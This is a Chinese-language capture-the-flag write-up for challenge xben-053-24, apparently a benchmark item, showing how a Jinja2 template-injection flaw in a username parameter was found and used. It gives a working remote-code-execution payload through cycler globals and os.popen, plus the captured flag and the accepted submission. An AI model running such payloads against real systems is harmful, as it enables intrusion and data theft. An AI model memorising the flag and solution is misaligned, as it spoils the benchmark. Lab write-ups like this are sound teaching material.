# xben-053-24 · 探索记录

对应题解：[`xben-053-24.md`](./xben-053-24.md)

## 目标与起点

`uvicorn`，标题 `Directory Listing`。页面正文：

```text
You can call this URL with a username querystring parameter, anything you put
there will be shown on the page.
Can you think of a way to exploit this?
HINT: This is the directory listing for this app.
```

目录列表：

```text
./  main.py  prestart.sh  flag.txt  Dockerfile  templates/index.html
```

## 第一阶段：确认回显

```bash
curl --get --data-urlencode 'username=ZZ' http://$T/
# Welcome ZZ!
```

## 第二阶段：SSTI 探针

| 输入 | 回显 |
| --- | --- |
| `{{7*7}}` | `Welcome 49!` ← **确认** |
| `${7*7}` | 原样 |
| `%s` / `{0}` | 原样（不是 printf/format） |

## 第三阶段：读文件

```bash
curl --get --data-urlencode "username={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" http://$T/
```

```text
Welcome flag{3de815cc-b830-4dba-8ae5-aefa0bcd9d3d}!
```

辅助确认：

```bash
{{ self.__init__.__globals__ }}
# {'__name__': 'jinja2.runtime', '__doc__': 'The runtime functions and state used by compiled templates.', …}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `{{ config }}` | 空 | 模板上下文没有 Flask config |
| `${7*7}`、`%s`、`{0}` | 原样 | 不是 JSP EL / printf / str.format |
| 直接 `?username=flag.txt` | 只回显字符串 | 需要模板求值才能读文件 |

## 这次真正的收获

1. **目录列表直接给出 `flag.txt`。** 页面把目录树打出来时，先看目标文件名，
   不用猜路径。
2. **`{{7*7}}` → 49 是最小 SSTI 判据。** 一次请求区分「字符串拼接」与「模板求值」。
3. **`cycler.__init__.__globals__.os` 是 Jinja2 最稳的 RCE 链之一。**
   本页 `{{ config }}` 为空，说明不能依赖 Flask 上下文；`cycler` 是内置全局，
   不依赖应用注入。
4. **`self.__init__.__globals__` 可作为交叉验证。** dump 出来的
   `jinja2.runtime` 全局字典能确认引擎与模块可用性。
